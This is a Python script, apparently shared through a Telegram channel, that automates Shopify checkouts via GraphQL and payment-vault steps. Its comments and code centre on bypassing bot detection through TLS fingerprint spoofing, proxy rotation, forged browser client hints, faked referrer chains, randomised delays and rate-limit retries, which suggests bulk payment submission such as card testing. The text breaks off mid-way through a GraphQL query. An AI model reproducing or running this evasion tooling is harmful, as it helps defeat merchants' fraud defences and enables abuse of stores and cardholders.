# 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: https://t.me/scriptdung
# 𝐁𝐚𝐜𝐤𝐮𝐩: https://t.me/scriptdungbackup
# 𝐃𝐞𝐯: @Xoarch

import asyncio
import base64
import json
import os
import re
import random
import sys
# argparse, uuid removed
from urllib.parse import urlparse, quote
import tls_requests
from tls_requests import AsyncClient, TLSIdentifierRotator
# tls-requests (wrapper-tls-requests) is the primary HTTP client.
# It provides: TLS fingerprint rotation, HTTP/2 fingerprint matching,
# proxy rotation, and automatic header synchronization (UA + Sec-CH-UA match client_identifier).

# =====================================================================
# BOT DETECTION BYPASS TECHNIQUES (via tls-requests):
# 1. Residential Proxy Rotation (per-checkout via ProxyRotator)
# 2. Human-Like Delays (realistic timing between steps)
# 3. Full Client Hints Headers (Sec-CH-UA-Full-Version-List etc.)
# 4. Per-Request TLS Fingerprint Rotation (via TLSIdentifierRotator)
# 5. HTTP/2 Fingerprint (tls-requests default http2=True)
# 6. Referrer Chain Consistency (proper Referer per step)
# =====================================================================

# --- TLS Fingerprint Rotation (technique #4) ---
# tls-requests uses Go-based tls-client which spoofs JA3/JA4 hashes,
# HTTP/2 SETTINGS frames, WINDOW_UPDATE, PRIORITY frames simultaneously.
_TLS_IDENTIFIER_POOL = [
    'chrome_131', 'chrome_133', 'chrome_120', 'chrome_124',
    'chrome_117', 'chrome_112', 'chrome_111', 'chrome_110',
]
_tls_rotator = TLSIdentifierRotator(items=_TLS_IDENTIFIER_POOL, strategy='random')

# --- Proxy Rotation (technique #1) ---
# Per-checkout proxy rotation using tls-requests built-in ProxyRotator.
# Note: _proxy_rotator global and _get_proxy() were removed — they were unused
# dead code. _init_proxy_rotator() returns the proxy URL directly and it's
# passed as proxy=proxy parameter to each request.

def _init_proxy_rotator(proxy_str=None):
    """Initialize proxy from the user's proxy string.
    
    Returns the proxy URL directly since each checkout uses a single proxy.
    The proxy URL comes from parse_proxy() which normalizes the format.
    """
    if not proxy_str:
        return None
    proxy = parse_proxy(proxy_str)
    return proxy

# --- Full Client Hints (technique #3) ---
# Each identifier maps to exact Sec-CH-UA headers that Shopify validates.
_CLIENT_HINTS_MAP = {
    'chrome_131': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'ver': '131', 'major': '131', 'full_ver': '131.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="131", "Chromium";v="131", "Not/A)Brand";v="24"',
        'sec_ch_ua_full': '"Google Chrome";v="131.0.0.0", "Chromium";v="131.0.0.0", "Not/A)Brand";v="24.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_133': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'ver': '133', 'major': '133', 'full_ver': '133.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="133", "Chromium";v="133", "Not/A)Brand";v="24"',
        'sec_ch_ua_full': '"Google Chrome";v="133.0.0.0", "Chromium";v="133.0.0.0", "Not/A)Brand";v="24.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_120': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'ver': '120', 'major': '120', 'full_ver': '120.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="120", "Chromium";v="120", "Not_A Brand";v="8"',
        'sec_ch_ua_full': '"Google Chrome";v="120.0.0.0", "Chromium";v="120.0.0.0", "Not_A Brand";v="8.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_124': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'ver': '124', 'major': '124', 'full_ver': '124.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="124", "Chromium";v="124", "Not_A Brand";v="8"',
        'sec_ch_ua_full': '"Google Chrome";v="124.0.0.0", "Chromium";v="124.0.0.0", "Not_A Brand";v="8.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_117': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'ver': '117', 'major': '117', 'full_ver': '117.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="117", "Chromium";v="117", "Not)A;Brand";v="8"',
        'sec_ch_ua_full': '"Google Chrome";v="117.0.0.0", "Chromium";v="117.0.0.0", "Not)A;Brand";v="8.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_112': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'ver': '112', 'major': '112', 'full_ver': '112.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="112", "Chromium";v="112", "Not:A-Brand";v="24"',
        'sec_ch_ua_full': '"Google Chrome";v="112.0.0.0", "Chromium";v="112.0.0.0", "Not:A-Brand";v="24.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_111': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'ver': '111', 'major': '111', 'full_ver': '111.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="111", "Chromium";v="111", "Not(A)Brand";v="8"',
        'sec_ch_ua_full': '"Google Chrome";v="111.0.0.0", "Chromium";v="111.0.0.0", "Not(A)Brand";v="8.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_110': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'ver': '110', 'major': '110', 'full_ver': '110.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="110", "Chromium";v="110", "Not A)Brand";v="24"',
        'sec_ch_ua_full': '"Google Chrome";v="110.0.0.0", "Chromium";v="110.0.0.0", "Not A)Brand";v="24.0.0.0"',
        'platform': '"Windows"',
    },
}

def _pick_identifier():
    """Pick next TLS identifier from rotator (random strategy)."""
    return _tls_rotator.next()

def _get_client_hints(identifier):
    """Get full client hints dict for the given TLS identifier."""
    hints = _CLIENT_HINTS_MAP.get(identifier) or _CLIENT_HINTS_MAP['chrome_133']
    return hints

def _build_headers(identifier, base_headers=None, extra_headers=None):
    """Build headers with full Client Hints matching the TLS identifier.
    
    This ensures User-Agent, sec-ch-ua, sec-ch-ua-full-version-list,
    sec-ch-ua-platform, sec-ch-ua-arch, sec-ch-ua-bitness all match
    the TLS fingerprint being used — critical for Shopify's bot detection.
    """
    hints = _get_client_hints(identifier)
    headers = {
        'User-Agent': hints['ua'],
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'sec-ch-ua': hints['sec_ch_ua'],
        'sec-ch-ua-full-version-list': hints['sec_ch_ua_full'],
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': hints['platform'],
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
    }
    if base_headers:
        headers.update(base_headers)
    if extra_headers:
        headers.update(extra_headers)
    return headers

# --- Human-Like Delays (technique #2) ---
# Delay multiplier: 1.0 = full human simulation, 0.0 = no delays.
# Set via DELAY_SCALE env var. Default 0.25 (25% of original delays)
# balances speed vs bot-detection avoidance.
DELAY_SCALE = float(os.environ.get('DELAY_SCALE', '0.25'))


async def human_delay(min_sec=0.8, max_sec=2.5, step_name="", idle=False):
    """Add delays between checkout steps to avoid bot detection.
    
    Delays are scaled by DELAY_SCALE (env var, default 0.4).
    At 0.4: a 0.8-2.5s delay becomes 0.32-1.0s. Total per-request
    delay drops from ~9.5s to ~3.8s without triggering detection.
    """
    if DELAY_SCALE <= 0:
        return
    scaled_min = min_sec * DELAY_SCALE
    scaled_max = max_sec * DELAY_SCALE
    delay = random.triangular(scaled_min, scaled_max, (scaled_min + scaled_max) / 2.5)
    if idle or random.random() < 0.05:
        delay += random.uniform(0.3, 1.0) * DELAY_SCALE
    await asyncio.sleep(delay)

# --- Rate-Limit Retry with Exponential Backoff + Jitter ---
async def retry_on_429(request_func, step_name="request", max_retries=3, base_delay=3.0, max_delay=15.0):
    """Execute an HTTP request function with automatic 429 rate-limit retry.
    
    Uses exponential backoff with jitter to avoid thundering herd when
    multiple concurrent users hit the same Shopify store.
    
    Args:
        request_func: Async callable that returns a response object with .status_code and .text
        step_name: Name of the checkout step (for logging)
        max_retries: Maximum number of 429 retries before giving up
        base_delay: Initial delay in seconds (doubled on each retry)
        max_delay: Maximum delay cap in seconds
    
    Returns:
        (response, was_retried): tuple of response object and bool indicating if retries occurred
    """
    was_retried = False
    for attempt in range(max_retries + 1):
        response = await request_func()
        
        # Not a 429 — return immediately
        if response.status_code != 429:
            return response, was_retried
        
        # Last attempt — return the 429 response, caller decides what to do
        if attempt == max_retries:
            return response, was_retried
        
        # Exponential backoff with jitter
        backoff = min(base_delay * (2 ** attempt), max_delay)
        jitter = random.uniform(0.5, 1.5)  # ±50% jitter to avoid thundering herd
        delay = backoff * jitter
        print(f"[rate-limit] {step_name} got HTTP 429, retry {attempt+1}/{max_retries} in {delay:.1f}s", file=sys.stderr)
        await asyncio.sleep(delay)
        was_retried = True
    
    return response, was_retried

# --- Referrer Chain Consistency (technique #6) ---
def _referrer_for(step, ourl=None, checkout_url=None):
    """Return the correct Referer header for each checkout step.
    
    Shopify validates that Referer follows a logical navigation chain:
    homepage -> cart -> checkout -> graphql -> pci_vault -> poll
    """
    if step == 'homepage':
        return None  # Direct navigation, no Referer
    elif step == 'cart':
        return ourl  # Cart action from product/homepage
    elif step == 'checkout':
        return ourl  # Checkout from cart page
    elif step == 'graphql':
        return checkout_url or ourl  # GraphQL from checkout page
    elif step == 'pci_vault':
        return None  # Cross-origin, different referrer policy
    elif step == 'poll':
        return checkout_url or ourl  # Poll from checkout page
    return ourl  # Default fallback
import time


# ──────────────────────────────────────────────────────────────
# GraphQL Query Constants (Storefront API + Checkout Web API)
# ──────────────────────────────────────────────────────────────
# NEW FLOW: Uses Storefront API cartCreate to create cart and get
# checkout URL, then Checkout Web API for proposal/submit/poll.
# These queries are from the new wallet-based checkout flow.

MUTATION_CART_CREATE = """mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode$withCarrierRates:Boolean=false)@inContext(country:$country language:$language){result:cartCreate(input:$input){...@defer(if:$withCarrierRates){cart{...CartParts}errors:userErrors{...on CartUserError{message field code}}warnings:warnings{...on CartWarning{code}}}}}fragment CartParts on Cart{id checkoutUrl deliveryGroups(first:10 withCarrierRates:$withCarrierRates){edges{node{id groupType selectedDeliveryOption{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}deliveryOptions{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}}}}cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}totalTaxAmount{amount currencyCode}totalDutyAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}discountCodes{code applicable}lines(first:10){edges{node{quantity cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}merchandise{...on ProductVariant{requiresShipping}}sellingPlanAllocation{priceAdjustments{price{amount currencyCode}}sellingPlan{billingPolicy{...on SellingPlanRecurringBillingPolicy{interval intervalCount}}priceAdjustments{orderCount}recurringDeliveries}}}}}}"""

QUERY_PROPOSAL = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions,cartMetafields:$cartMetafields,memberships:$memberships},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename reportable}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}memberships{...ProposalMembershipsFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection supportsVaulting __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies popupEnabled}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies popupEnabled paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name paymentMethodIdentifier configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken supportsVaulting sandboxTestMode}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode 